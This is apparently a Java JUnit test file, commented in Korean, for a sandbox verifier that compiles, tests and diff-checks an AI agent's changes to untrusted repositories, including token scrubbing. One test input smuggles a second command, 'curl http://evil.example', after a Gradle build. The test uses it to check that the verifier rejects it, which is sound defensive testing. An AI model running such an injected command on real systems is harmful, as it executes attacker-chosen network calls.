package com.ossagent.candidate.adapter.out.sandbox;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import com.ossagent.agent.adapter.out.sandbox.SandboxProperties;
import com.ossagent.agent.domain.ExecuteCommand;
import com.ossagent.agent.domain.FakeCodeSandbox;
import com.ossagent.agent.domain.SandboxCommand;
import com.ossagent.candidate.domain.StageOutcome;
import com.ossagent.candidate.domain.VerificationReport;
import com.ossagent.candidate.domain.VerificationRequest;
import com.ossagent.candidate.domain.VerificationSetupException;
import com.ossagent.candidate.domain.VerificationStage;
import com.ossagent.repository.domain.ContributionConstraints;
import com.ossagent.repository.domain.RepositoryCoordinates;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Duration;
import java.util.List;
import java.util.Set;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.springframework.util.unit.DataSize;

/**
 * 검증 파이프라인 구현 — #19 · 🔴 S-3.
 *
 * <p>여기서 보는 것은 <b>조립과 순서</b>다. 판정 규칙 자체는
 * {@code VerificationJudgementTest} 가 본다.
 *
 * <p>⚠ 샌드박스 컨테이너를 띄우지 않는다 — 대상 저장소 코드는 신뢰할 수 없고(S-3),
 * CI 에서 Docker 를 가정할 수 없다({@code testing-philosophy.md}).
 */
class SandboxChangeVerifierTest {

    /**
     * 🔴 <b>조립한다</b> — 요구 3(샘플의 대표성). {@code TokenRedactor} 의 패턴은
     * {@code gh[pousr]_[A-Za-z0-9]{20,}} 라 <b>밑줄이 섞이면 물리지 않는다.</b>
     * 「가짜임이 보이는 이름」(예: {@code ghp_NOT_A_REAL_TOKEN…})을 그대로 쓰면
     * 이 테스트가 <b>검사 대상이 아닌 것을 검사</b>하게 되어 공허해진다 —
     * 마스킹 경계가 실제로 유의미한 테스트라 {@code testing-philosophy.md} 가
     * 조립을 허용하는 바로 그 경우다. {@code TokenRedactorTest} 와 같은 관용구다.
     */
    private static final String FAKE_CLASSIC_PAT = "ghp_" + "a".repeat(30);

    @TempDir
    Path root;

    private Path workspace;
    private FakeCodeSandbox sandbox;
    private com.ossagent.agent.domain.FakeDependencyCache dependencyCache;
    private SandboxChangeVerifier verifier;

    @BeforeEach
    void setUp() throws IOException {
        workspace = Files.createDirectories(root.resolve("candidate-1"));
        sandbox = new FakeCodeSandbox();
        dependencyCache = new com.ossagent.agent.domain.FakeDependencyCache();
        verifier = new SandboxChangeVerifier(sandbox, dependencyCache, properties(root));
    }

    // ── 의존성 캐시 (#18 배선) ──────────────────────────────────────────────

    @Test
    @DisplayName("🔴 실행 전에 의존성 캐시를 준비한다 — 빈 캐시로 돌리면 「테스트 실패」로 오분류된다")
    void 실행_전에_캐시를_준비한다() {
        verifier.verify(request(constraints("./gradlew compileJava", "./gradlew test")));

        assertThat(dependencyCache.prepared())
                .as("🔴 준비 없이 network=none 으로 돌리면 의존성 해석 실패가 빌드 실패로 보고된다")
                .isNotEmpty();
    }

    @Test
    @DisplayName("🔴 캐시 준비가 실패하면 대상 저장소 명령을 돌리지 않는다")
    void 캐시_준비가_실패하면_실행하지_않는다() {
        dependencyCache.thenFailWith(
                new com.ossagent.agent.domain.SandboxPermanentException("워밍 실패"));

        org.assertj.core.api.Assertions.assertThatThrownBy(() ->
                        verifier.verify(request(constraints("./gradlew compileJava", null))))
                .isInstanceOf(com.ossagent.agent.domain.SandboxException.class);

        assertThat(sandbox.commands())
                .as("🔴 준비가 실패했는데 실행하면 그 결과가 후보의 코드 탓으로 기록된다")
                .isEmpty();
    }

    // ── S-3 ────────────────────────────────────────────────────────────────

    @Test
    @DisplayName("🔴 모든 실행이 ExecuteCommand 다 — 네트워크가 열린 명령 타입을 쓰지 않는다_S3")
    void 실행은_전부_샌드박스_실행_명령이다_S3() {
        verifier.verify(request(constraints("./gradlew compileJava", "./gradlew test")));

        assertThat(sandbox.commands())
                .as("""
                        ExecuteCommand 가 아닌 명령 타입이 섞였다.
                        WarmCommand 는 네트워크가 열려 있고, 검증 단계는 대상 저장소 코드를
                        돌린다 — 그 조합이 S-3 가 막는 바로 그것이다.""")
                .isNotEmpty()
                .allSatisfy(it -> assertThat(it).isInstanceOf(ExecuteCommand.class));
    }

    @Test
    @DisplayName("🔴 명령이 argv 로 간다 — sh -c 로 감싸지 않는다_S3")
    void 명령을_쉘로_감싸지_않는다_S3() {
        verifier.verify(request(constraints("./gradlew compileJava", "./gradlew test")));

        assertThat(argvOf(sandbox.commands().get(0)))
                .as("첫 인자가 sh·bash 면 규약 문자열이 쉘에서 해석된다")
                .startsWith("./gradlew")
                .doesNotContain("sh", "bash", "-c");
    }

    @Test
    @DisplayName("🔴 쉘 메타문자가 든 규약 명령은 시작조차 하지 않는다_S3")
    void 쉘_메타문자가_있으면_시작하지_않는다_S3() {
        var withShell = constraints("./gradlew build && curl http://evil.example", "./gradlew test");

        assertThatThrownBy(() -> verifier.verify(request(withShell)))
                .isInstanceOf(VerificationSetupException.class);
        assertThat(sandbox.commands())
                .as("거부하기 전에 컨테이너를 띄우면 방어가 한 발 늦다")
                .isEmpty();
    }

    @Test
    @DisplayName("🔴 Gradle 이 아니면 거부한다 — 「모르면 해 본다」가 조용히 네트워크를 연다 (Q-4)")
    void 지원하지_않는_빌드_도구를_거부한다_S3() {
        var maven = constraints("mvn -B compile", "mvn -B test");

        assertThatThrownBy(() -> verifier.verify(request(maven)))
                .hasMessageContaining("Q-4");
        assertThat(sandbox.commands()).isEmpty();
    }

    // ── 단계 순서 ──────────────────────────────────────────────────────────

    @Test
    @DisplayName("🔴 컴파일이 깨지면 멈추고, 뒤 단계는 SKIPPED 로 명시한다")
    void 컴파일_실패에서_멈춘다() {
        sandbox.givenSequence(FakeCodeSandbox.exitedWith(1, "compilation error"));

        var report = verifier.verify(request(constraints("./gradlew compileJava", "./gradlew test")));

        assertThat(sandbox.commands())
                .as("컴파일이 깨졌는데 테스트를 30분 돌릴 이유가 없다")
                .hasSize(1);
        assertOutcomes(report, StageOutcome.FAILED, StageOutcome.SKIPPED, StageOutcome.SKIPPED);
        assertThat(report.passed()).isFalse();
    }

    @Test
    @DisplayName("테스트가 깨지면 diff 를 보지 않는다")
    void 테스트_실패에서_멈춘다() {
        sandbox.givenSequence(
                FakeCodeSandbox.ok("compiled"),
                FakeCodeSandbox.exitedWith(1, "2 tests failed"));

        var report = verifier.verify(request(constraints("./gradlew compileJava", "./gradlew test")));

        assertThat(sandbox.commands()).hasSize(2);
        assertOutcomes(report, StageOutcome.PASSED, StageOutcome.FAILED, StageOutcome.SKIPPED);
    }

    @Test
    @DisplayName("전부 통과하면 여섯 번 부른다 — 컴파일·테스트·add·diff 목록·diff 본문·reset")
    void 전부_통과하면_diff_까지_본다() {
        sandbox.givenSequence(
                FakeCodeSandbox.ok("compiled"),
                FakeCodeSandbox.ok("tests passed"),
                FakeCodeSandbox.ok(""),   // git add -A (#100)
                FakeCodeSandbox.ok("3\t1\tsrc/main/java/Foo.java\n"),
                FakeCodeSandbox.ok("+++ b/src/main/java/Foo.java\n+log.info(\"ok\");\n"));

        var report = verifier.verify(request(constraints("./gradlew compileJava", "./gradlew test")));

        assertThat(sandbox.commands()).hasSize(6);
        // 🔴 DIFF 는 스테이징 → 목록 → 본문 → 되돌림 순서다 (#100). 새 파일은 add -A 뒤에만 보인다
        assertThat(sandbox.commands().subList(2, 6)).extracting(SandboxCommand::argv)
                .containsExactly(
                        List.of("git", "add", "-A"),
                        List.of("git", "diff", "--cached", "--numstat"),
                        List.of("git", "diff", "--cached", "--unified=0"),
                        List.of("git", "reset", "-q"));
        assertOutcomes(report, StageOutcome.PASSED, StageOutcome.PASSED, StageOutcome.PASSED);
        assertThat(report.passed()).isTrue();
    }

    // ── 준비 (#99) ─────────────────────────────────────────────────────────

    /**
     * 🔴 워밍은 <b>코딩 전</b> 원본 clone 에서 한다. verify 안에서 처음 워밍하면 생성 코드가
     * testClasses 컴파일에 섞여, 컴파일 실패가 종료코드가 아니라 예외(종단)로 나왔다.
     */
    @Test
    @DisplayName("prepare 는 워밍·씨딩만 하고 대상 저장소 명령을 돌리지 않는다")
    void prepare_는_워밍만_한다() {
        var request = request(constraints("./gradlew compileJava", "./gradlew test"));

        verifier.prepare(request.candidateId(), request.coordinates(), request.workspacePath(),
                request.constraints());

        assertThat(dependencyCache.prepared()).containsExactly(request.coordinates());
        assertThat(sandbox.commands()).as("실행 단계는 코딩 뒤의 일이다").isEmpty();
    }

    @Test
    @DisplayName("prepare 도 빌드 명령이 없으면 시작하지 않는다 — S-5")
    void prepare_도_빌드_명령이_없으면_거부한다_S5() {
        var request = request(constraints(null, "./gradlew test"));

        assertThatThrownBy(() -> verifier.prepare(request.candidateId(), request.coordinates(),
                request.workspacePath(), request.constraints()))
                .isInstanceOf(VerificationSetupException.class);
        assertThat(dependencyCache.prepared()).isEmpty();
    }

    // ── 판정 불가 ──────────────────────────────────────────────────────────

    @Test
    @DisplayName("🔴 테스트 명령이 없으면 UNDETERMINED 다 — 「통과」가 아니고 「건너뜀」도 아니다_S5")
    void 테스트_명령이_없으면_판정_불가다_S5() {
        sandbox.givenSequence(FakeCodeSandbox.ok("compiled"));

        var report = verifier.verify(request(constraints("./gradlew compileJava", null)));

        assertThat(report.stage(VerificationStage.TEST))
                .get()
                .satisfies(it -> assertThat(it.outcome())
                        .as("돌리지 않은 테스트를 「통과」로 적으면 이 제품의 게이트가 사라진다")
                        .isEqualTo(StageOutcome.UNDETERMINED));
        assertThat(report.passed()).isFalse();
        assertThat(report.hasUndetermined())
                .as("재시도해도 테스트 명령은 생기지 않는다 — Q-6 예산을 태우지 않게 갈라야 한다")
                .isTrue();
    }

    @Test
    @DisplayName("🔴 diff 가 0건이면 UNDETERMINED 다 — 아무것도 검사하지 않고 초록이 되지 않는다")
    void diff_가_0건이면_판정_불가다() {
        // `git add -A` 뒤에도 0건이면 코딩 단계가 아무것도 바꾸지 않은 것이다 (#100).
        // 그대로 두면 계획 범위 검사가 0건을 훑고 PASSED 가 된다 — 이 저장소가 반복해
        // 당한 「0건을 검사하고 초록」의 런타임판이다.
        sandbox.givenSequence(
                FakeCodeSandbox.ok("compiled"),
                FakeCodeSandbox.ok("tests passed"),
                FakeCodeSandbox.ok(""),   // git add -A (#100)
                FakeCodeSandbox.ok(""));

        var report = verifier.verify(request(constraints("./gradlew compileJava", "./gradlew test")));

        assertThat(report.stage(VerificationStage.DIFF))
                .get()
                .satisfies(it -> assertThat(it.outcome())
                        .as("""
                                변경 0건을 「깨끗하다」로 접었다.
                                검증은 언제나 코드를 고친 뒤에 돈다 — 0건은 「우리가 엉뚱한 것을
                                보고 있다」는 뜻이고, 통과로 접으면 계획 범위 게이트가 통째로
                                무력해진다 (모수 ≠ 0).""")
                        .isEqualTo(StageOutcome.UNDETERMINED));
        assertThat(report.passed()).isFalse();
        assertThat(sandbox.commands())
                .as("0건을 확인했으면 diff 본문을 받을 이유가 없다 — 되돌림(reset)은 항상 돈다")
                .hasSize(5);
        assertThat(sandbox.commands().get(4).argv()).containsExactly("git", "reset", "-q");
    }

    @Test
    @DisplayName("🔴 테스트 명령이 다른 빌드 도구면 시작 전에 거부한다 (Q-4)")
    void 테스트_명령의_빌드_도구도_검사한다_S3() {
        // 빌드는 Gradle 인데 테스트가 Maven 이면, 안 막을 경우 컴파일을 통과한 뒤
        // TEST 단계가 Gradle 배선으로 돌아 network=none 때문에 실패한다 —
        // fail-closed 이긴 하나 「코드가 틀렸다」로 보고되어 재시도 예산을 태운다.
        var mixed = constraints("./gradlew compileJava", "mvn -B test");

        assertThatThrownBy(() -> verifier.verify(request(mixed)))
                .hasMessageContaining("Q-4");
        assertThat(sandbox.commands())
                .as("컴파일을 돌린 뒤에 거부하면 컨테이너 한 번이 헛돈다")
                .isEmpty();
    }

    @Test
    @DisplayName("🔴 diff 목록이 잘리면 UNDETERMINED 다 — 「위반 없음」을 말할 근거가 없다")
    void diff_목록이_잘리면_판정_불가다() {
        sandbox.givenSequence(
                FakeCodeSandbox.ok("compiled"),
                FakeCodeSandbox.ok("tests passed"),
                FakeCodeSandbox.ok(""),   // git add -A (#100)
                FakeCodeSandbox.truncated("3\t1\tsrc/main/java/Foo.java\n"));

        var report = verifier.verify(request(constraints("./gradlew compileJava", "./gradlew test")));

        assertThat(report.stage(VerificationStage.DIFF))
                .get()
                .satisfies(it -> assertThat(it.outcome()).isEqualTo(StageOutcome.UNDETERMINED));
    }

    @Test
    @DisplayName("🔴 빌드 출력이 잘려도 컴파일·테스트 판정은 흔들리지 않는다 — 종료코드만 본다")
    void 출력_절단이_종료코드_판정을_바꾸지_않는다() {
        sandbox.givenSequence(
                FakeCodeSandbox.truncated("아주 긴 Gradle 로그"),
                FakeCodeSandbox.truncated("아주 긴 테스트 로그"),
                FakeCodeSandbox.ok(""),   // git add -A (#100)
                FakeCodeSandbox.ok("3\t1\tsrc/main/java/Foo.java\n"),
                FakeCodeSandbox.ok(""));

        var report = verifier.verify(request(constraints("./gradlew compileJava", "./gradlew test")));

        assertThat(report.stage(VerificationStage.COMPILE))
                .get()
                .satisfies(it -> {
                    assertThat(it.outcome())
                            .as("""
                                    절단을 판정 불가로 접으면 모든 후보가 코드 문제 없이 FAILED 가 된다 —
                                    max-output-chars 는 200,000 이고 Gradle 로그는 일상적으로 그것을 넘는다.
                                    방어가 스스로를 잠그는 구조다.""")
                            .isEqualTo(StageOutcome.PASSED);
                    assertThat(it.outputTruncated()).isTrue();
                });
        assertThat(report.passed()).isTrue();
    }

    // ── diff 판정 ──────────────────────────────────────────────────────────

    @Test
    @DisplayName("🔴 계획 범위 밖 변경은 FAILED 이고, 본문은 받지도 않는다")
    void 범위_밖_변경이면_본문을_받지_않는다() {
        sandbox.givenSequence(
                FakeCodeSandbox.ok("compiled"),
                FakeCodeSandbox.ok("tests passed"),
                FakeCodeSandbox.ok(""),   // git add -A (#100)
                FakeCodeSandbox.ok("3\t1\tsrc/main/java/Foo.java\n40\t2\tbuild.gradle\n"));

        var report = verifier.verify(request(constraints("./gradlew compileJava", "./gradlew test")));

        assertThat(sandbox.commands())
                .as("값싸고 잘 잘리지 않는 검사가 먼저 걸렀으면 본문을 받을 이유가 없다 — 되돌림은 항상 돈다")
                .hasSize(5);
        assertThat(report.stage(VerificationStage.DIFF))
                .get()
                .satisfies(it -> {
                    assertThat(it.outcome()).isEqualTo(StageOutcome.FAILED);
                    assertThat(it.summary()).contains("build.gradle");
                });
    }

    // ── S-4 ────────────────────────────────────────────────────────────────

    @Test
    @DisplayName("🔴 빌드 출력의 토큰이 보고서에 남지 않는다_S4")
    void 빌드_출력을_스크럽한다_S4() {
        sandbox.givenSequence(FakeCodeSandbox.exitedWith(1,
                "> Task :printEnv\nGITHUB_TOKEN=" + FAKE_CLASSIC_PAT + "\n"));

        var report = verifier.verify(request(constraints("./gradlew compileJava", "./gradlew test")));

        assertThat(report.failureSummary())
                .as("이 값은 GeneratedChange.testResult(DB) 와 재시도 프롬프트로 나간다")
                .doesNotContain(FAKE_CLASSIC_PAT)
                .contains("Task :printEnv");
    }

    // ── 도우미 ─────────────────────────────────────────────────────────────

    private static void assertOutcomes(VerificationReport report, StageOutcome compile,
            StageOutcome test, StageOutcome diff) {
        assertThat(report.outcomes()).containsExactlyInAnyOrderEntriesOf(java.util.Map.of(
                VerificationStage.COMPILE, compile,
                VerificationStage.TEST, test,
                VerificationStage.DIFF, diff));
    }

    private static List<String> argvOf(SandboxCommand command) {
        return command.argv();
    }

    private VerificationRequest request(ContributionConstraints constraints) {
        return new VerificationRequest(1L, new RepositoryCoordinates("spring-projects", "spring-kafka"),
                1, workspace, constraints, Set.of("src/main/java/Foo.java"));
    }

    private static ContributionConstraints constraints(String build, String test) {
        return new ContributionConstraints("21", build, test, true, true, false);
    }

    private static SandboxProperties properties(Path workspaceRoot) {
        return new SandboxProperties(workspaceRoot, "oss-agent-sandbox:21", "oss-agent-warm",
                2.0, DataSize.ofGigabytes(4), 512L, Duration.ofMinutes(30), Duration.ofMinutes(20),
                Duration.ofSeconds(60), 200_000, "1.44", null);
    }
}
